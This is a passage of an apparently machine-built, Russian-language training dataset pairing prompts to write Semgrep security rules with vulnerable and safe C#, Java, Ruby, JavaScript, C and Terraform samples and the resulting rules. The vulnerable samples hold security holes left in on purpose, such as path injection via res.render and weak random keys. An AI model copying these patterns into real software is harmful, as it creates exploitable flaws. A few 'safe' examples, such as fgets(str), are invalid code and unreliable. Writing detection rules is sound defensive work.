    "output": "rules:\n- id: open-redirect\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - focus-metavariable: $PARAM\n    - pattern-inside: |\n        public $TYPE $FUNCNAME (..., string $PARAM, ...) {\n          ...\n        }\n  pattern-sinks:\n  - patterns:\n    - pattern: Redirect(...)\n    - pattern-not-inside: |\n        if (IsLocalUrl(...)) { \n            ... \n            Redirect(...); \n            ...\n        }\n    - pattern-not-inside: |\n        if ($URL.IsLocalUrl(...)) { \n            ... \n            Redirect(...); \n            ...\n        }\n  message: >-\n    A query string parameter may contain a URL value that could cause the\n    web application to redirect the request to a malicious website controlled by\n    an attacker. Make sure to sanitize this parameter sufficiently.\n  metadata:\n    category: security\n    technology:\n    - csharp\n    cwe:\n    - \"CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\"\n    references:\n    - https://cwe.mitre.org/data/definitions/601.html\n    owasp:\n    - A01:2021 - Broken Access Control\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - csharp\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска уязвимостей open-redirect в коде на C#. Анализ основан на поиске источника потенциально опасных параметров ($PARAM), переданных функции ($FUNCNAME), которая возвращает перенаправление (Redirect(...)). Уязвимость возникает, если перенаправление не проверяется на локальность ($URL.IsLocalUrl(...) или IsLocalUrl(...)), что позволяет атакующему манипулировать возвращаемым URL и перенаправить пользователя на нежелательный сайт.\n\n# Ключевые элементы:\n- ID: open-redirect\n- Язык: csharp \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "open-redirect",
      "language": "csharp",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения gcp-insecure-load-balancer-tls-version\nОписание уязвимости: Detected GCP Load Balancer to be using an insecure version of TLS. To fix this set your \"min_tls_version\" to \"TLS_1_2\"\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: terraform",
    "input": "Требования:\n- Язык: terraform\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-insecure-load-balancer-tls-version.tf\n# ruleid: gcp-insecure-load-balancer-tls-version\nresource \"google_compute_ssl_policy\" \"badCode\" {\n  name = \"badCode\"\n  min_tls_version = \"TLS_1_0\"\n  # ...\n}\n\n# ok: gcp-insecure-load-balancer-tls-version\nresource \"google_compute_ssl_policy\" \"okCode\" {\n  name = \"okCode\"\n  min_tls_version = \"TLS_1_2\"\n  # ...\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_compute_ssl_policy\" \"badCode\" { \n  name = \"badCode\"\n  min_tls_version = \"TLS_1_0\"\n  # ...\n}\n• resource \"google_compute_ssl_policy\" \"anotherBadCode\" { \n  name = \"anotherBadCode\"\n  min_tls_version = \"TLS_1_1\"\n  # ...\n}\n\nБезопасные паттерны:  \n• resource \"google_compute_ssl_policy\" \"okCode\" { \n  name = \"okCode\"\n  min_tls_version = \"TLS_1_2\"\n  # ...\n}\n• resource \"google_compute_ssl_policy\" \"yetAnotherOkCode\" { \n  name = \"yetAnotherOkCode\"\n  min_tls_version = \"TLS_1_3\"\n  # ...\n}\n\nЛегенда аннотаций:\n- // ruleid:gcp-insecure-load-balancer-tls-version: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-insecure-load-balancer-tls-version: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-insecure-load-balancer-tls-version\n  patterns:\n  - pattern: |\n      resource \"google_compute_ssl_policy\" $ANYTHING {\n        ...\n        min_tls_version = \"...\"\n        ...\n      }\n  - pattern-not: |\n      resource \"google_compute_ssl_policy\" $ANYTHING {\n        ...\n        min_tls_version = \"TLS_1_2\"\n        ...\n      }\n  message: >-\n    Detected GCP Load Balancer to be using an insecure version of TLS. To fix this set your \"min_tls_version\"\n    to \"TLS_1_2\"\n  languages:\n  - terraform\n  severity: WARNING\n  metadata:\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    technology:\n    - gcp\n    - terraform\n    category: security\n    references:\n    - https://docs.bridgecrew.io/docs/google-cloud-policy-index\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google Compute Engine SSL Policy в Terraform конфигурациях, где указан небезопасный уровень версии TLS ('TLS_1_0'). Правило использует шаблон ресурса google_compute_ssl_policy с условием, что значение атрибута min_tls_version не равно 'TLS_1_2'. Это позволяет обнаружить случаи использования устаревших версий TLS, которые могут быть уязвимы к атакам типа downgrade attack.\n\n# Ключевые элементы:\n- ID: gcp-insecure-load-balancer-tls-version\n- Язык: terraform \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-insecure-load-balancer-tls-version",
      "language": "terraform",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения weak-random\nОписание уязвимости: Detected use of the functions `Math.random()` or `java.util.Random()`. These are both not cryptographically strong random number generators (RNGs). If you are using these RNGs to create passwords or secret tokens, use `java.security.SecureRandom` instead.\nCWE: CWE-330: Use of Insufficiently Random Values\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-330: Use of Insufficiently Random Values\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: weak-random.java\n/**\n * OWASP Benchmark v1.2\n *\n * <p>This file is part of the Open Web Application Security Project (OWASP) Benchmark Project. For\n * details, please see <a\n * href=\"https://owasp.org/www-project-benchmark/\">https://owasp.org/www-project-benchmark/</a>.\n *\n * <p>The OWASP Benchmark is free software: you can redistribute it and/or modify it under the terms\n * of the GNU General Public License as published by the Free Software Foundation, version 2.\n *\n * <p>The OWASP Benchmark is distributed in the hope that it will be useful, but WITHOUT ANY\n * WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR\n * PURPOSE. See the GNU General Public License for more details.\n *\n * @author Dave Wichers\n * @created 2015\n */\npackage org.owasp.benchmark.testcode;\n\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(value = \"/weakrand-00/BenchmarkTest00023\")\npublic class BenchmarkTest00023 extends HttpServlet {\n\n    private static final long serialVersionUID = 1L;\n\n    @Override\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doPost(request, response);\n    }\n\n    @Override\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        // some code\n        response.setContentType(\"text/html;charset=UTF-8\");\n\n        String param = request.getParameter(\"BenchmarkTest00023\");\n        if (param == null) param = \"\";\n\n        // ruleid: weak-random\n        float rand = new java.util.Random().nextFloat();\n\n        // ruleid: weak-random\n        new java.util.Random().nextInt();\n        String rememberMeKey = Float.toString(rand).substring(2); // Trim off the 0. at   # Ограничиваем длину\n\nОпасные паттерны:\n• new java.util.Random().nextFloat();\n• double value = java.lang.Math.random();\n\nБезопасные паттерны:  \n• double value2 = java.security.SecureRandom();\n• float rand = new SecureRandom().nextFloat();\n\nЛегенда аннотаций:\n- // ruleid:weak-random: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:weak-random: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: weak-random\n  message: >-\n    Detected use of the functions `Math.random()` or `java.util.Random()`. These are both not\n    cryptographically strong random number generators (RNGs). If you are using these\n    RNGs to create passwords or secret tokens, use `java.security.SecureRandom` instead.\n  languages: [java]\n  severity: WARNING\n  metadata:\n    functional-categories:\n      - 'crypto::search::randomness::java.security'\n    owasp:\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-330: Use of Insufficiently Random Values'\n    category: security\n    technology:\n    - java\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  pattern-either:\n  - pattern: |\n      new java.util.Random(...).$FUNC(...)\n  - pattern: |\n      java.lang.Math.random(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функций Math.random() или java.util.Random() в Java-коде. Эти функции не являются криптографически сильными генераторами случайных чисел (RNG), и их следует избегать при создании паролей или секретных токенов. Вместо этого рекомендуется использовать java.security.SecureRandom. Правило использует оператор pattern-either для проверки обоих типов вызовов функций.\n\n# Ключевые элементы:\n- ID: weak-random\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "weak-random",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения http-client-requests\nОписание уязвимости: Checks for requests to http (unencrypted) sites using some of ruby's most popular REST/HTTP libraries, including httparty and restclient.\nCWE: C\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: http-client-requests.rb\nrequire 'httparty'\n\ndef bad1\n  # ruleid: http-client-requests\n  response = HTTParty.get('http://example.com', format: :plain)\n  JSON.parse response, symbolize_names: true\nend\n\ndef bad2\n  # ruleid: http-client-requests\n  str = 'http://example.com'\n  # ruleid: http-client-requests\n  response = HTTParty.get(str, format: :plain)\n  JSON.parse response, symbolize_names: true\nend\n\ndef bad3\n  # ruleid: http-client-requests\n  RestClient.get('http://example.com/resource')\nend\n\ndef bad4\n  # ruleid: http-client-requests\n  RestClient.post \"http://example.com/resource\", {'x' => 1}.to_json, {content_type: :json, accept: :json}\nend\n\ndef bad5\n  # ruleid: http-client-requests\n  RestClient::Request.execute(method: :get, url: 'http://httpbin.org/redirect/1', max_redirects: 0)\nend\n\ndef ok1\n  # ok: http-client-requests\n  response = HTTParty.get('https://example.com', format: :plain)\n  JSON.parse response, symbolize_names: true\nend\n\ndef ok2\n  # ok: http-client-requests\n  str = 'https://example.com'\n  response = HTTParty.get(str, format: :plain)\n  JSON.parse response, symbolize_names: true\nend\n\ndef ok3\n  # ok: http-client-requests\n  RestClient.get('https://example.com/resource')\nend\n\ndef ok4\n  # ok: http-client-requests\n  RestClient.post \"https://example.com/resource\", {'x' => 1}.to_json, {content_type: :json, accept: :json}\nend\n\ndef ok5\n  # ok: http-client-requests\n  RestClient::Request.execute(method: :get, url: 'https://httpbin.org/redirect/1', max_redirects: 0)\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• response = HTTParty.get('http://example.com', format: :plain)\n• str = 'http://example.com'; response = HTTParty.get(str, format: :plain)\n• RestClient.get('http://example.com/resource')\n\nБезопасные паттерны:  \n• response = HTTParty.get('https://example.com', format: :plain)\n• str = 'https://example.com'; response = HTTParty.get(str, format: :plain)\n• RestClient.get('https://example.com/resource')\n\nЛегенда аннотаций:\n- // ruleid:http-client-requests: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:http-client-requests: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: http-client-requests\n  message: >-\n    Checks for requests to http (unencrypted) sites using some of ruby's most popular REST/HTTP libraries,\n    including httparty and restclient.\n  severity: WARNING\n  metadata:\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    category: security\n    cwe: 'CWE-319: Cleartext Transmission of Sensitive Information'\n    owasp: 'A03:2017 - Sensitive Data Exposure'\n    references:\n    - https://github.com/rest-client/rest-client\n    - https://github.com/jnunemaker/httparty/tree/master/docs\n    subcategory:\n    - vuln\n    technology:\n    - httparty\n    - rest-client\n    vulnerability: Insecure Transport\n  languages:\n  - ruby\n  pattern-either:\n  - pattern: |\n      HTTParty.$PARTYVERB(\"=~/[hH][tT][tT][pP]://.*/\", ...)\n  - pattern: |\n      $STRING = \"=~/[hH][tT][tT][pP]://.*/\"\n      ...\n      HTTParty.$PARTYVERB($STRING, ...)\n  - pattern: |\n      RestClient.$RESTVERB \"=~/[hH][tT][tT][pP]://.*/\", ...\n  - pattern: |\n      RestClient::Request.execute(..., url: \"=~/[hH][tT][tT][pP]://.*/\", ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска небезопасных HTTP-запросов, сделанных с использованием популярных библиотек Ruby для работы с HTTP, таких как Httparty и RestClient. Правило использует шаблон или комбинацию шаблонов для выявления вызовов методов get/post/execute этих библиотек, где URL начинается с 'http://'. Шаблоны включают прямое указание URL в виде строки или регулярного выражения, а также косвенное указание через переменную, содержащую URL.\n\n# Ключевые элементы:\n- ID: http-client-requests\n- Язык: ruby \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "http-client-requests",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: insecure-use-scanf-fn\nОписание уязвимости: Avoid using 'scanf()'. This function, when used improperly, does not consider buffer boundaries and can lead to buffer overflows. Use 'fgets()' instead for reading input.\nCWE: CWE-676: Use of Potentially Dangerous Function\nТип анализа: search\nЯзык: c",
    "input": "Требования:\n- Язык: c\n- Тип анализа: search\n- CWE: CWE-676: Use of Potentially Dangerous Function\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-use-scanf-fn.c\n#include <stdio.h>\n\nint DST_BUFFER_SIZE = 120;\n\nint bad_code() {\n    char str[DST_BUFFER_SIZE];\n    // ruleid:insecure-use-scanf-fn\n    scanf(\"%s\", str);\n    printf(\"%s\", str);\n    return 0;\n}\n\nint main() {\n    char str[DST_BUFFER_SIZE];\n    // ok:insecure-use-scanf-fn\n    fgets(str);\n    printf(\"%s\", str);\n    return 0;\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid:insecure-use-scanf-fn\nscanf(\"%s\", str);\n• // ruleid:insecure-use-scanf-fn\nscanf(\"%d\", &var);\n\nБезопасные паттерны:  \n• // ok:insecure-use-scanf-fn\nfgets(str);\n• // ok:insecure-use-scanf-fn\nfgets(buffer, size, stdin);\n\nЛегенда аннотаций:\n- // ruleid:insecure-use-scanf-fn: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-use-scanf-fn: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-use-scanf-fn\n  pattern: scanf(...)\n  message: >-\n    Avoid using 'scanf()'. This function, when used improperly, does not consider\n    buffer boundaries and can lead to buffer overflows. Use 'fgets()' instead\n    for reading input.\n  metadata:\n    cwe:\n    - 'CWE-676: Use of Potentially Dangerous Function'\n    references:\n    - http://sekrit.de/webdocs/c/beginners-guide-away-from-scanf.html\n    category: security\n    technology:\n    - c\n    confidence: LOW\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n  languages: [c]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции scanf(). Паттерн 'scanf(...)' используется для обнаружения любых вызовов данной функции. Правило предупреждает о потенциальной уязвимости, связанной с отсутствием контроля границ буфера, что может привести к переполнению буфера. Рекомендуется использовать функцию fgets() вместо scanf() для безопасной обработки ввода.\n\n# Ключевые элементы:\n- ID: insecure-use-scanf-fn\n- Язык: c \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-use-scanf-fn",
      "language": "c",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: res-render-injection\nОписание уязвимости: User controllable data `$REQ` enters `$RES.render(...)` this can lead to the loading of other HTML/templating pages that they may not be authorized to render. An attacker may attempt to use directory traversal techniques e.g. `../folder/index` to access other HTML pages on the file system. Where possible, do not allow users to define what should be  loaded in $RES.render or use an allow list for the existing application.\nCWE: CWE-706: Use of Incorrectly-Resolved Name or Reference\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-706: Use of Incorrectly-Resolved Name or Reference\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: res-render-injection.js\nconst express = require('express')\nconst app = express()\nconst port = 3000\n\nconst hardcodedPath = 'lib/layout'\n\nfunction testController1(req, res) {\n    // ruleid: res-render-injection\n    return res.render(`tpl.${req.query.path}`, {foo: bar})\n};\n\napp.get('/test1', testController1)\n\napp.get('/test2', (req, res) => {\n    // ruleid: res-render-injection\n    return res.render('tpl.' + req.query.path + '.smth-else', {foo: bar})\n})\n\napp.get('/ok-test', (req, res) => {\n    // ok: res-render-injection\n    return res.render(hardcodedPath, {foo: bar})\n})\n\napp.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))  # Ограничиваем длину\n\nОпасные паттерны:\n• return res.render(`tpl.${req.query.path}`, {foo: bar})\n• return res.render('tpl.' + req.query.path + '.smth-else', {foo: bar})\n\nБезопасные паттерны:  \n• return res.render(hardcodedPath, {foo: bar})\n\nЛегенда аннотаций:\n- // ruleid:res-render-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:res-render-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: res-render-injection\n  message: >-\n    User controllable data `$REQ` enters `$RES.render(...)` this can lead to the loading\n    of other HTML/templating pages that they may not be authorized to render. An attacker\n    may attempt to use directory traversal techniques e.g. `../folder/index` to access other\n    HTML pages on the file system. Where possible, do not allow users to define what should be \n    loaded in $RES.render or use an allow list for the existing application.\n  options:\n    interfile: true\n  metadata:\n    interfile: true\n    owasp:\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-706: Use of Incorrectly-Resolved Name or Reference'\n    category: security\n    technology:\n    - express\n    references:\n    - http://expressjs.com/en/4x/api.html#res.render\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: function ... ($REQ, $RES) {...}\n      - pattern-inside: function ... ($REQ, $RES, $NEXT) {...}\n      - patterns:\n        - pattern-either:\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES) {...})\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES, $NEXT) {...})\n        - metavariable-regex:\n            metavariable: $METHOD\n            regex: ^(get|post|put|head|delete|options)$\n    - pattern-either:\n      - pattern: $REQ.query\n      - pattern: $REQ.body\n      - pattern: $REQ.params\n      - pattern: $REQ.cookies\n      - pattern: $REQ.headers\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response, $NEXT: NextFunction) =>\n          {...}\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response) => {...}\n    - focus-metavariable: $REQ\n    - pattern-either:\n      - pattern: params\n      - pattern: query\n      - pattern: cookies\n      - pattern: headers\n      - pattern: body\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: $RES.render($SINK, ...)\n    - focus-metavariable: $SINK\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции res.render() в Express.js фреймворке, где имя шаблона передается напрямую из пользовательского ввода (`req.query`, `req.body`, `req.params`, `req.cookies`, `req.headers`), что может привести к инъекциям путей и несанкционированному доступу к другим страницам приложения. Правило использует шаблон источников для идентификации функций, принимающих запрос и ответ, а затем проверяет, используется ли переменная запроса или другого источника для формирования имени шаблона в вызове res.render().\n\n# Ключевые элементы:\n- ID: res-render-injection\n- Язык: javascript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "res-render-injection",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: weak-hashes-md5\nОписание уязвимости: Should not use md5 to generate hashes. md5 is proven to be vulnerable through the use of brute-force attacks. Could also result in collisions, leading to potential collision attacks. Use SHA256 or other hashing functions instead.\nCWE: CWE-328: Use of Weak Hash\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-328: Use of Weak Hash\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: weak-hashes-md5.rb\nrequire 'digest'\nclass Bad_md5\n    def bad_md5_code()\n        # ruleid: weak-hashes-md5\n        md5 = Digest::MD5.hexdigest 'abc'\n        # ruleid: weak-hashes-md5\n        md5 = Digest::MD5.new\n        # ruleid: weak-hashes-md5\n        md5 = Digest::MD5.base64digest 'abc'\n        # ruleid: weak-hashes-md5\n        md5 = Digest::MD5.digest 'abc'\n\n        # ruleid: weak-hashes-md5\n        digest = OpenSSL::Digest::MD5.new\n        # ruleid: weak-hashes-md5\n        digest = OpenSSL::Digest::MD5.hexdigest 'abc'\n        # ruleid: weak-hashes-md5\n        digest = OpenSSL::Digest::MD5.new\n        # ruleid: weak-hashes-md5\n        digest = OpenSSL::Digest::MD5.base64digest 'abc'\n        # ruleid: weak-hashes-md5\n        digest = OpenSSL::Digest::MD5.digest 'abc'\n    end\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• md5 = Digest::MD5.hexdigest 'abc'\n• digest = OpenSSL::Digest::MD5.hexdigest 'abc'\n\nБезопасные паттерны:  \n• md5 = Digest::SHA256.hexdigest 'abc'\n• digest = OpenSSL::Digest::SHA256.hexdigest 'abc'\n\nЛегенда аннотаций:\n- // ruleid:weak-hashes-md5: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:weak-hashes-md5: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: weak-hashes-md5\n  message: >-\n    Should not use md5 to generate hashes. md5 is proven to be vulnerable through\n    the use of brute-force attacks.\n    Could also result in collisions, leading to potential collision attacks. Use SHA256\n    or other hashing functions instead.\n  metadata:\n    cwe:\n    - 'CWE-328: Use of Weak Hash'\n    references:\n    - https://www.ibm.com/support/pages/security-bulletin-vulnerability-md5-signature-and-hash-algorithm-affects-sterling-integrator-and-sterling-file-gateway-cve-2015-7575\n    category: security\n    technology:\n    - ruby\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: HIGH\n    confidence: MEDIUM\n  languages:\n  - ruby\n  severity: WARNING\n  pattern-either:\n  - pattern: Digest::MD5.base64digest $X\n  - pattern: Digest::MD5.hexdigest $X\n  - pattern: Digest::MD5.digest $X\n  - pattern: Digest::MD5.new\n  - pattern: OpenSSL::Digest::MD5.base64digest $X\n  - pattern: OpenSSL::Digest::MD5.hexdigest $X\n  - pattern: OpenSSL::Digest::MD5.digest $X\n  - pattern: OpenSSL::Digest::MD5.new\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования алгоритма хеширования MD5 в Ruby-коде. Оно использует шаблон 'pattern-either' для обнаружения различных методов и конструкторов класса Digest::MD5 и OpenSSL::Digest::MD5, которые могут быть использованы для создания слабых хэшей. Правило применимо только к Ruby-коду.\n\n# Ключевые элементы:\n- ID: weak-hashes-md5\n- Язык: ruby \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "weak-hashes-md5",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: azure-key-backedby-hsm\nОписание уязвимости: Ensure that key vault key is backed by HSM\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-key-backedby-hsm.tf\n# fail\n# ruleid: azure-key-backedby-hsm\nresource \"azurerm_key_vault_key\" \"generated\" {\n    name         = \"generated-certificate\"\n    key_vault_id = azurerm_key_vault.example.id\n    key_type     = \"RSA\"\n    key_size     = 2048\n\n    key_opts = [\n    \"decrypt\",\n    \"encrypt\",\n    \"sign\",\n    \"unwrapKey\",\n    \"verify\",\n    \"wrapKey\",\n    ]\n}\n\n# pass\nresource \"azurerm_key_vault_key\" \"generated\" {\n    name         = \"generated-certificate\"\n    key_vault_id = azurerm_key_vault.example.id\n    key_type     = \"EC-HSM\"\n    key_size     = 2048\n\n    key_opts = [\n    \"decrypt\",\n    \"encrypt\",\n    \"sign\",\n    \"unwrapKey\",\n    \"verify\",\n    \"wrapKey\",\n    ]\n    expiration_date = \"2020-12-30T20:00:00Z\"\n}\n\n# pass\nresource \"azurerm_key_vault_key\" \"generated\" {\n    name         = \"generated-certificate\"\n    key_vault_id = azurerm_key_vault.example.id\n    key_type     = \"RSA-HSM\"\n    key_size     = 2048\n\n    key_opts = [\n      \"decrypt\",\n      \"encrypt\",\n      \"sign\",\n      \"unwrapKey\",\n      \"verify\",\n      \"wrapKey\",\n    ]\n    expiration_date = \"2020-12-30T20:00:00Z\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_key_vault_key\" \"generated\" { \n    name         = \"generated-certificate\"\n    key_vault_id = azurerm_key_vault.example.id\n    key_type     = \"RSA\"\n    key_size     = 2048\n\n    key_opt\n• resource \"azurerm_key_vault_key\" \"generated\" { \n    name         = \"generated-certificate\"\n    key_vault_id = azurerm_key_vault.example.id\n    key_type     = \"EC\"\n    key_size     = 2048\n\n    key_opts\n\nБезопасные паттерны:  \n• resource \"azurerm_key_vault_key\" \"generated\" { \n    name         = \"generated-certificate\"\n    key_vault_id = azurerm_key_vault.example.id\n    key_type     = \"EC-HSM\"\n    key_size     = 2048\n\n    key_\n• resource \"azurerm_key_vault_key\" \"generated\" { \n    name         = \"generated-certificate\"\n    key_vault_id = azurerm_key_vault.example.id\n    key_type     = \"RSA-HSM\"\n    key_size     = 2048\n\n    key\n\nЛегенда аннотаций:\n- // ruleid:azure-key-backedby-hsm: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-key-backedby-hsm: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-key-backedby-hsm\n  message: >-\n    Ensure that key vault key is backed by HSM\n  patterns:\n  - pattern: resource\n  - pattern-not-inside: |\n      resource \"azurerm_key_vault_key\" \"...\" {\n      ...\n      key_type = \"EC-HSM\"\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"azurerm_key_vault_key\" \"...\" {\n      ...\n      key_type = \"RSA-HSM\"\n      ...\n      }\n  - pattern-inside: |\n      resource \"azurerm_key_vault_key\" \"...\" {\n      ...\n      }\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure Key Vault Key, которые не используют аппаратно защищенный модуль (HSM). Анализ выполняется путем поиска шаблонов ресурса Key Vault Key в Terraform конфигурационном файле (HCL). Правило исключает случаи, когда тип ключа явно указан как EC-HSM или RSA-HSM, поскольку эти типы уже аппаратно защищены. Для этого используются конструкции pattern-inside и pattern-not-inside для сопоставления блоков кода вокруг ключевых слов key_type.\n\n# Ключевые элементы:\n- ID: azure-key-backedby-hsm\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-key-backedby-hsm",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения sling-http-request\nОписание уязвимости: Checks for requests to http (unencrypted) sites using gorequest, a popular HTTP client library. This is dangerous because it could result in plaintext PII being passed around the network.\nCWE: C\nТип анализа: search\nЯзык: go",
